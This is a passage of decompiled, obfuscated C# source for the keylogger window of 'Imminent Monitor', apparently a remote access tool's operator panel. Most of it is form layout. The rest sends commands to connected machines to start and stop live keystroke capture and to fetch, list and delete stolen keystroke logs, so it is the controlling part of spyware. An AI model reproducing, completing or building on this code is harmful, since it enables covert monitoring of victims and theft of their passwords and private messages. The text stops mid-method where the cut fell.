// Decompiled with JetBrains decompiler
// Type: FormKeylogger
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using FastColoredTextBoxNS;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormKeylogger : Form
{
  private IContainer icontainer_0;
  private GControl6 gcontrol6_0;
  private TabPage tabPage_0;
  private TabPage tabPage_1;
  private GClass17 gclass17_0;
  private GClass34 gclass34_0;
  private Button button_0;
  private Button button_1;
  private Button button_2;
  private Button button_3;
  private GClass17 gclass17_1;
  private GClass34 gclass34_1;
  private CheckBox checkBox_0;
  private TabPage tabPage_2;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ImageList imageList_0;
  private FastColoredTextBox fastColoredTextBox_0;
  private FastColoredTextBox fastColoredTextBox_1;
  private Button button_4;
  private GClass18 gclass18_0;
  private ChromiumWebBrowser chromiumWebBrowser_0;
  private TextStyle textStyle_0;

  public FormKeylogger(GClass18 gclass18_1)
  {
    this.Load += new EventHandler(this.FormKeylogger_Load);
    this.FormClosing += new FormClosingEventHandler(this.FormKeylogger_FormClosing);
    this.textStyle_0 = new TextStyle(Brushes.MediumBlue, (Brush) null, FontStyle.Regular);
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.gclass18_0.method_20().formKeylogger_0 = this;
    this.Text = string.Format("{0}/{1}", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.MinimumSize = new Size(1016, 688);
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormKeylogger));
    this.vmethod_15(new Button());
    this.vmethod_17(new Button());
    this.vmethod_23(new CheckBox());
    this.vmethod_25(new TabPage());
    this.vmethod_27(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_29(new ToolStripMenuItem());
    this.vmethod_31(new ToolStripSeparator());
    this.vmethod_33(new ToolStripMenuItem());
    this.vmethod_35(new ImageList(this.icontainer_0));
    this.vmethod_1(new GControl6());
    this.vmethod_3(new TabPage());
    this.vmethod_7(new GClass17());
    this.vmethod_9(new GClass34());
    this.vmethod_37(new FastColoredTextBox());
    this.vmethod_5(new TabPage());
    this.vmethod_41(new Button());
    this.vmethod_39(new FastColoredTextBox());
    this.vmethod_11(new Button());
    this.vmethod_13(new Button());
    this.vmethod_19(new GClass17());
    this.vmethod_21(new GClass34());
    this.vmethod_26().SuspendLayout();
    this.vmethod_0().SuspendLayout();
    this.vmethod_2().SuspendLayout();
    this.vmethod_6().BeginInit();
    this.vmethod_6().Panel1.SuspendLayout();
    this.vmethod_6().Panel2.SuspendLayout();
    this.vmethod_6().SuspendLayout();
    ((ISupportInitialize) this.vmethod_36()).BeginInit();
    this.vmethod_4().SuspendLayout();
    ((ISupportInitialize) this.vmethod_38()).BeginInit();
    this.vmethod_18().BeginInit();
    this.vmethod_18().Panel1.SuspendLayout();
    this.vmethod_18().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_14().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_14().Enabled = false;
    this.vmethod_14().ImageAlign = ContentAlignment.MiddleRight;
    Button button1 = this.vmethod_14();
    Point point1 = new Point(165, 431);
    Point point2 = point1;
    button1.Location = point2;
    this.vmethod_14().Name = "ButtonStop";
    Button button2 = this.vmethod_14();
    Size size1 = new Size(157, 23);
    Size size2 = size1;
    button2.Size = size2;
    this.vmethod_14().TabIndex = 3;
    this.vmethod_14().Text = "Stop Live Keylogger";
    this.vmethod_14().TextImageRelation = TextImageRelation.ImageBeforeText;
    this.vmethod_14().UseVisualStyleBackColor = true;
    this.vmethod_16().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_16().ImageAlign = ContentAlignment.MiddleRight;
    Button button3 = this.vmethod_16();
    point1 = new Point(2, 431);
    Point point3 = point1;
    button3.Location = point3;
    this.vmethod_16().Name = "ButtonStart";
    Button button4 = this.vmethod_16();
    size1 = new Size(157, 23);
    Size size3 = size1;
    button4.Size = size3;
    this.vmethod_16().TabIndex = 2;
    this.vmethod_16().Text = "Start Live Keylogger";
    this.vmethod_16().TextImageRelation = TextImageRelation.ImageBeforeText;
    this.vmethod_16().UseVisualStyleBackColor = true;
    this.vmethod_22().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_22().AutoSize = true;
    CheckBox checkBox1 = this.vmethod_22();
    point1 = new Point(0, 442);
    Point point4 = point1;
    checkBox1.Location = point4;
    this.vmethod_22().Name = "CheckBoxHighlight";
    CheckBox checkBox2 = this.vmethod_22();
    size1 = new Size(67, 17);
    Size size4 = size1;
    checkBox2.Size = size4;
    this.vmethod_22().TabIndex = 1;
    this.vmethod_22().Text = "Highlight";
    this.vmethod_22().UseVisualStyleBackColor = true;
    TabPage tabPage1 = this.vmethod_24();
    point1 = new Point(0, 0);
    Point point5 = point1;
    tabPage1.Location = point5;
    this.vmethod_24().Name = "TabPage1";
    TabPage tabPage2 = this.vmethod_24();
    size1 = new Size(200, 100);
    Size size5 = size1;
    tabPage2.Size = size5;
    this.vmethod_24().TabIndex = 0;
    this.vmethod_26().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_26().Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_28(),
      (ToolStripItem) this.vmethod_30(),
      (ToolStripItem) this.vmethod_32()
    });
    this.vmethod_26().Name = "ContextMenuStripKeylogger";
    ContextMenuStrip contextMenuStrip = this.vmethod_26();
    size1 = new Size(153, 76);
    Size size6 = size1;
    contextMenuStrip.Size = size6;
    this.vmethod_28().Image = (Image) Class145.smethod_9();
    this.vmethod_28().Name = "RefreshLogsToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_28();
    size1 = new Size(152, 22);
    Size size7 = size1;
    toolStripMenuItem1.Size = size7;
    this.vmethod_28().Text = "Refresh Logs";
    this.vmethod_30().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator = this.vmethod_30();
    size1 = new Size(149, 6);
    Size size8 = size1;
    toolStripSeparator.Size = size8;
    this.vmethod_32().Image = (Image) Class145.smethod_22();
    this.vmethod_32().Name = "DeleteLogToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_32();
    size1 = new Size(152, 22);
    Size size9 = size1;
    toolStripMenuItem2.Size = size9;
    this.vmethod_32().Text = "Delete Log";
    this.vmethod_34().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListKeylogger.ImageStream");
    this.vmethod_34().TransparentColor = Color.Transparent;
    this.vmethod_34().Images.SetKeyName(0, "document-stand.png");
    this.vmethod_34().Images.SetKeyName(1, "document-text.png");
    this.vmethod_0().Alignment = TabAlignment.Left;
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Controls.Add((Control) this.vmethod_2());
    this.vmethod_0().Controls.Add((Control) this.vmethod_4());
    this.vmethod_0().DrawMode = TabDrawMode.OwnerDrawFixed;
    GControl6 gcontrol6_1 = this.vmethod_0();
    size1 = new Size(30, 150);
    Size size10 = size1;
    gcontrol6_1.ItemSize = size10;
    GControl6 gcontrol6_2 = this.vmethod_0();
    point1 = new Point(275, 79);
    Point point6 = point1;
    gcontrol6_2.Location = point6;
    this.vmethod_0().Multiline = true;
    this.vmethod_0().Name = "FlatTab1";
    this.vmethod_0().SelectedIndex = 0;
    GControl6 gcontrol6_3 = this.vmethod_0();
    size1 = new Size(713, 559);
    Size size11 = size1;
    gcontrol6_3.Size = size11;
    this.vmethod_0().SizeMode = TabSizeMode.Fixed;
    this.vmethod_0().TabIndex = 0;
    this.vmethod_2().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_2().Controls.Add((Control) this.vmethod_6());
    TabPage tabPage3 = this.vmethod_2();
    point1 = new Point(0, 0);
    Point point7 = point1;
    tabPage3.Location = point7;
    this.vmethod_2().Name = "TabPageKeylogger";
    TabPage tabPage4 = this.vmethod_2();
    Padding padding1 = new Padding(3);
    Padding padding2 = padding1;
    tabPage4.Padding = padding2;
    TabPage tabPage5 = this.vmethod_2();
    size1 = new Size(713, 559);
    Size size12 = size1;
    tabPage5.Size = size12;
    this.vmethod_2().TabIndex = 0;
    this.vmethod_2().Tag = (object) "normal";
    this.vmethod_2().Text = "Keylogger";
    this.vmethod_6().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_6().Dock = DockStyle.Fill;
    GClass17 gclass17_1 = this.vmethod_6();
    point1 = new Point(3, 3);
    Point point8 = point1;
    gclass17_1.Location = point8;
    this.vmethod_6().Name = "SplitContainer1";
    this.vmethod_6().Panel1.Controls.Add((Control) this.vmethod_8());
    this.vmethod_6().Panel1MinSize = 137;
    this.vmethod_6().Panel2.Controls.Add((Control) this.vmethod_36());
    GClass17 gclass17_2 = this.vmethod_6();
    size1 = new Size(707, 553);
    Size size13 = size1;
    gclass17_2.Size = size13;
    this.vmethod_6().SplitterDistance = 163;
    this.vmethod_6().SplitterIncrement = 2;
    this.vmethod_6().SplitterWidth = 3;
    this.vmethod_6().TabIndex = 3;
    this.vmethod_8().BorderStyle = BorderStyle.FixedSingle;
    this.vmethod_8().ContextMenuStrip = this.vmethod_26();
    this.vmethod_8().Dock = DockStyle.Fill;
    this.vmethod_8().FullRowSelect = true;
    this.vmethod_8().ImageIndex = 0;
    this.vmethod_8().ImageList = this.vmethod_34();
    this.vmethod_8().LineColor = Color.FromArgb(160, 160, 160);
    GClass34 gclass34_1 = this.vmethod_8();
    point1 = new Point(0, 0);
    Point point9 = point1;
    gclass34_1.Location = point9;
    this.vmethod_8().Name = "TreeViewLogs";
    this.vmethod_8().SelectedImageIndex = 0;
    GClass34 gclass34_2 = this.vmethod_8();
    size1 = new Size(163, 553);
    Size size14 = size1;
    gclass34_2.Size = size14;
    this.vmethod_8().TabIndex = 1;
    ((Control) this.vmethod_36()).Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_36().AutoCompleteBracketsList = new char[10]
    {
      '(',
      ')',
      '{',
      '}',
      '[',
      ']',
      '"',
      '"',
      '\'',
      '\''
    };
    this.vmethod_36().AutoIndentCharsPatterns = string.Empty;
    FastColoredTextBox fastColoredTextBox1 = this.vmethod_36();
    size1 = new Size(0, 12);
    Size size15 = size1;
    fastColoredTextBox1.AutoScrollMinSize = size15;
    this.vmethod_36().BackBrush = (Brush) null;
    ((UserControl) this.vmethod_36()).BorderStyle = BorderStyle.FixedSingle;
    this.vmethod_36().CharHeight = 12;
    this.vmethod_36().CharWidth = 7;
    this.vmethod_36().Cursor = Cursors.IBeam;
    this.vmethod_36().DisabledColor = Color.FromArgb(100, 180, 180, 180);
    this.vmethod_36().Font = new Font("Courier New", 8.25f);
    this.vmethod_36().ForeColor = Color.Green;
    this.vmethod_36().IsReplaceMode = false;
    FastColoredTextBox fastColoredTextBox2 = this.vmethod_36();
    point1 = new Point(3, 0);
    Point point10 = point1;
    ((Control) fastColoredTextBox2).Location = point10;
    ((Control) this.vmethod_36()).Name = "TextBoxKeylogger";
    FastColoredTextBox fastColoredTextBox3 = this.vmethod_36();
    padding1 = new Padding(0);
    Padding padding3 = padding1;
    fastColoredTextBox3.Paddings = padding3;
    this.vmethod_36().SelectionColor = Color.FromArgb(50, 0, 0, (int) byte.MaxValue);
    this.vmethod_36().ServiceColors = (ServiceColors) componentResourceManager.GetObject("TextBoxKeylogger.ServiceColors");
    this.vmethod_36().ShowLineNumbers = false;
    FastColoredTextBox fastColoredTextBox4 = this.vmethod_36();
    size1 = new Size(536, 550);
    Size size16 = size1;
    ((Control) fastColoredTextBox4).Size = size16;
    ((Control) this.vmethod_36()).TabIndex = 6;
    this.vmethod_36().WordWrap = true;
    this.vmethod_36().Zoom = 100;
    this.vmethod_4().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_4().Controls.Add((Control) this.vmethod_40());
    this.vmethod_4().Controls.Add((Control) this.vmethod_38());
    this.vmethod_4().Controls.Add((Control) this.vmethod_10());
    this.vmethod_4().Controls.Add((Control) this.vmethod_12());
    TabPage tabPage6 = this.vmethod_4();
    point1 = new Point(0, 0);
    Point point11 = point1;
    tabPage6.Location = point11;
    this.vmethod_4().Name = "TabPageLive";
    TabPage tabPage7 = this.vmethod_4();
    padding1 = new Padding(3);
    Padding padding4 = padding1;
    tabPage7.Padding = padding4;
    TabPage tabPage8 = this.vmethod_4();
    size1 = new Size(713, 559);
    Size size17 = size1;
    tabPage8.Size = size17;
    this.vmethod_4().TabIndex = 1;
    this.vmethod_4().Tag = (object) "normal";
    this.vmethod_4().Text = "Live Keylogger";
    this.vmethod_40().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    Button button5 = this.vmethod_40();
    point1 = new Point(618, 530);
    Point point12 = point1;
    button5.Location = point12;
    this.vmethod_40().Name = "ButtonScroll";
    Button button6 = this.vmethod_40();
    size1 = new Size(95, 23);
    Size size18 = size1;
    button6.Size = size18;
    this.vmethod_40().TabIndex = 8;
    this.vmethod_40().Text = "Scroll to End";
    this.vmethod_40().UseVisualStyleBackColor = true;
    ((Control) this.vmethod_38()).Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_38().AutoCompleteBracketsList = new char[10]
    {
      '(',
      ')',
      '{',
      '}',
      '[',
      ']',
      '"',
      '"',
      '\'',
      '\''
    };
    this.vmethod_38().AutoIndentCharsPatterns = string.Empty;
    FastColoredTextBox fastColoredTextBox5 = this.vmethod_38();
    size1 = new Size(0, 12);
    Size size19 = size1;
    fastColoredTextBox5.AutoScrollMinSize = size19;
    this.vmethod_38().BackBrush = (Brush) null;
    ((UserControl) this.vmethod_38()).BorderStyle = BorderStyle.FixedSingle;
    this.vmethod_38().CharHeight = 12;
    this.vmethod_38().CharWidth = 7;
    this.vmethod_38().Cursor = Cursors.IBeam;
    this.vmethod_38().DisabledColor = Color.FromArgb(100, 180, 180, 180);
    this.vmethod_38().Font = new Font("Courier New", 8.25f);
    this.vmethod_38().ForeColor = Color.Green;
    this.vmethod_38().IsReplaceMode = false;
    FastColoredTextBox fastColoredTextBox6 = this.vmethod_38();
    point1 = new Point(0, 3);
    Point point13 = point1;
    ((Control) fastColoredTextBox6).Location = point13;
    ((Control) this.vmethod_38()).Name = "TextboxLive";
    FastColoredTextBox fastColoredTextBox7 = this.vmethod_38();
    padding1 = new Padding(0);
    Padding padding5 = padding1;
    fastColoredTextBox7.Paddings = padding5;
    this.vmethod_38().SelectionColor = Color.FromArgb(50, 0, 0, (int) byte.MaxValue);
    this.vmethod_38().ServiceColors = (ServiceColors) componentResourceManager.GetObject("TextboxLive.ServiceColors");
    this.vmethod_38().ShowLineNumbers = false;
    FastColoredTextBox fastColoredTextBox8 = this.vmethod_38();
    size1 = new Size(713, 521);
    Size size20 = size1;
    ((Control) fastColoredTextBox8).Size = size20;
    ((Control) this.vmethod_38()).TabIndex = 7;
    this.vmethod_38().WordWrap = true;
    this.vmethod_38().Zoom = 100;
    this.vmethod_10().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_10().Enabled = false;
    this.vmethod_10().Image = (Image) Class145.smethod_21();
    this.vmethod_10().ImageAlign = ContentAlignment.MiddleRight;
    Button button7 = this.vmethod_10();
    point1 = new Point(31, 530);
    Point point14 = point1;
    button7.Location = point14;
    this.vmethod_10().Name = "ButtonStopLiveLog";
    Button button8 = this.vmethod_10();
    size1 = new Size(25, 23);
    Size size21 = size1;
    button8.Size = size21;
    this.vmethod_10().TabIndex = 5;
    this.vmethod_10().TextImageRelation = TextImageRelation.ImageBeforeText;
    this.vmethod_10().UseVisualStyleBackColor = true;
    this.vmethod_12().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_12().Image = (Image) Class145.smethod_20();
    this.vmethod_12().ImageAlign = ContentAlignment.MiddleRight;
    Button button9 = this.vmethod_12();
    point1 = new Point(0, 530);
    Point point15 = point1;
    button9.Location = point15;
    this.vmethod_12().Name = "ButtonStartLiveLog";
    Button button10 = this.vmethod_12();
    size1 = new Size(25, 23);
    Size size22 = size1;
    button10.Size = size22;
    this.vmethod_12().TabIndex = 4;
    this.vmethod_12().TextAlign = ContentAlignment.MiddleLeft;
    this.vmethod_12().TextImageRelation = TextImageRelation.ImageBeforeText;
    this.vmethod_12().UseVisualStyleBackColor = true;
    this.vmethod_18().BackColor = Color.White;
    this.vmethod_18().Dock = DockStyle.Fill;
    GClass17 gclass17_3 = this.vmethod_18();
    point1 = new Point(3, 3);
    Point point16 = point1;
    gclass17_3.Location = point16;
    this.vmethod_18().Name = "SplitContainerEx1";
    this.vmethod_18().Panel1.Controls.Add((Control) this.vmethod_20());
    this.vmethod_18().Panel1MinSize = 137;
    GClass17 gclass17_4 = this.vmethod_18();
    size1 = new Size(166, 100);
    Size size23 = size1;
    gclass17_4.Size = size23;
    this.vmethod_18().SplitterDistance = 137;
    this.vmethod_18().SplitterWidth = 3;
    this.vmethod_18().TabIndex = 0;
    this.vmethod_20().BorderStyle = BorderStyle.FixedSingle;
    this.vmethod_20().Dock = DockStyle.Fill;
    this.vmethod_20().FullRowSelect = true;
    this.vmethod_20().LineColor = Color.FromArgb(160, 160, 160);
    GClass34 gclass34_3 = this.vmethod_20();
    point1 = new Point(0, 0);
    Point point17 = point1;
    gclass34_3.Location = point17;
    this.vmethod_20().Name = "AeroTreeView1";
    GClass34 gclass34_4 = this.vmethod_20();
    size1 = new Size(137, 100);
    Size size24 = size1;
    gclass34_4.Size = size24;
    this.vmethod_20().TabIndex = 0;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(241, 244, 245);
    size1 = new Size(1000, 649);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormKeylogger);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X - Keylogger";
    this.vmethod_26().ResumeLayout(false);
    this.vmethod_0().ResumeLayout(false);
    this.vmethod_2().ResumeLayout(false);
    this.vmethod_6().Panel1.ResumeLayout(false);
    this.vmethod_6().Panel2.ResumeLayout(false);
    this.vmethod_6().EndInit();
    this.vmethod_6().ResumeLayout(false);
    ((ISupportInitialize) this.vmethod_36()).EndInit();
    this.vmethod_4().ResumeLayout(false);
    ((ISupportInitialize) this.vmethod_38()).EndInit();
    this.vmethod_18().Panel1.ResumeLayout(false);
    this.vmethod_18().EndInit();
    this.vmethod_18().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual GControl6 vmethod_0() => this.gcontrol6_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GControl6 gcontrol6_1) => this.gcontrol6_0 = gcontrol6_1;

  internal virtual TabPage vmethod_2() => this.tabPage_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(TabPage tabPage_3) => this.tabPage_0 = tabPage_3;

  internal virtual TabPage vmethod_4() => this.tabPage_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(TabPage tabPage_3) => this.tabPage_1 = tabPage_3;

  internal virtual GClass17 vmethod_6() => this.gclass17_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(GClass17 gclass17_2) => this.gclass17_0 = gclass17_2;

  internal virtual GClass34 vmethod_8() => this.gclass34_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(GClass34 gclass34_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_10);
    if (this.gclass34_0 != null)
      this.gclass34_0.DoubleClick -= eventHandler;
    this.gclass34_0 = gclass34_2;
    if (this.gclass34_0 == null)
      return;
    this.gclass34_0.DoubleClick += eventHandler;
  }

  internal virtual Button vmethod_10() => this.button_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(Button button_5)
  {
    EventHandler eventHandler = new EventHandler(this.method_12);
    if (this.button_0 != null)
      this.button_0.Click -= eventHandler;
    this.button_0 = button_5;
    if (this.button_0 == null)
      return;
    this.button_0.Click += eventHandler;
  }

  internal virtual Button vmethod_12() => this.button_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(Button button_5)
  {
    EventHandler eventHandler = new EventHandler(this.method_11);
    if (this.button_1 != null)
      this.button_1.Click -= eventHandler;
    this.button_1 = button_5;
    if (this.button_1 == null)
      return;
    this.button_1.Click += eventHandler;
  }

  internal virtual Button vmethod_14() => this.button_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(Button button_5) => this.button_2 = button_5;

  internal virtual Button vmethod_16() => this.button_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(Button button_5) => this.button_3 = button_5;

  internal virtual GClass17 vmethod_18() => this.gclass17_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(GClass17 gclass17_2) => this.gclass17_1 = gclass17_2;

  internal virtual GClass34 vmethod_20() => this.gclass34_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(GClass34 gclass34_2) => this.gclass34_1 = gclass34_2;

  internal virtual CheckBox vmethod_22() => this.checkBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(CheckBox checkBox_1) => this.checkBox_0 = checkBox_1;

  internal virtual TabPage vmethod_24() => this.tabPage_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(TabPage tabPage_3) => this.tabPage_2 = tabPage_3;

  internal virtual ContextMenuStrip vmethod_26() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_28() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_14);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_30() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_32() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_13);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ImageList vmethod_34() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_35(ImageList imageList_1) => this.imageList_0 = imageList_1;

  public virtual FastColoredTextBox vmethod_36() => this.fastColoredTextBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_37(FastColoredTextBox fastColoredTextBox_2)
  {
    EventHandler<TextChangedEventArgs> eventHandler = new EventHandler<TextChangedEventArgs>(this.method_16);
    if (this.fastColoredTextBox_0 != null)
      this.fastColoredTextBox_0.TextChanged -= eventHandler;
    this.fastColoredTextBox_0 = fastColoredTextBox_2;
    if (this.fastColoredTextBox_0 == null)
      return;
    this.fastColoredTextBox_0.TextChanged += eventHandler;
  }

  public virtual FastColoredTextBox vmethod_38() => this.fastColoredTextBox_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_39(FastColoredTextBox fastColoredTextBox_2)
  {
    EventHandler<TextChangedEventArgs> eventHandler = new EventHandler<TextChangedEventArgs>(this.method_17);
    if (this.fastColoredTextBox_1 != null)
      this.fastColoredTextBox_1.TextChanged -= eventHandler;
    this.fastColoredTextBox_1 = fastColoredTextBox_2;
    if (this.fastColoredTextBox_1 == null)
      return;
    this.fastColoredTextBox_1.TextChanged += eventHandler;
  }

  internal virtual Button vmethod_40() => this.button_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_41(Button button_5)
  {
    EventHandler eventHandler = new EventHandler(this.method_18);
    if (this.button_4 != null)
      this.button_4.Click -= eventHandler;
    this.button_4 = button_5;
    if (this.button_4 == null)
      return;
    this.button_4.Click += eventHandler;
  }

  private void FormKeylogger_Load(object sender, EventArgs e)
  {
    this.gclass18_0.method_20().formKeylogger_0 = this;
    this.method_2();
    this.method_15();
    Class97.smethod_15(this.vmethod_26());
  }

  private void FormKeylogger_FormClosing(object sender, FormClosingEventArgs e) => this.method_4();

  private void method_0(string string_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Keylogger,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.Download,
    (object) string_0
  });

  private void method_1(string string_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Keylogger,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.Delete,
    (object) string_0
  });

  private void method_2()
  {
    this.vmethod_8().Nodes.Clear();
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Keylogger,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.Refresh
    });
  }

  private void method_3() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Keylogger,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.StartLive
  });

  private void method_4() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Keylogger,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.StopLive
  });

  public void method_5(object[] object_0)
  {
    this.vmethod_8().Nodes.Clear();
    int num1 = object_0.Length - 1;
    for (int index = 2; index <= num1; ++index)
    {
      string str = (string) object_0[index];
      TreeNode node = new TreeNode()
      {
        Text = DateAndTime.MonthName(Conversions.ToInteger(str.Split(Conversions.ToCharArrayRankOne("-"))[1]))
      };
      node.Name = node.Text;
      node.ImageIndex = 0;
      node.SelectedImageIndex = 0;
      if (!this.vmethod_8().Nodes.ContainsKey(node.Name))
        this.vmethod_8().Nodes.Add(node);
    }
    int num2 = object_0.Length - 1;
    for (int index = 2; index <= num2; ++index)
    {
      string str = (string) object_0[index];
      TreeNodeCollection nodes = this.vmethod_8().Nodes;
      try
      {
        foreach (TreeNode treeNode in nodes)
        {
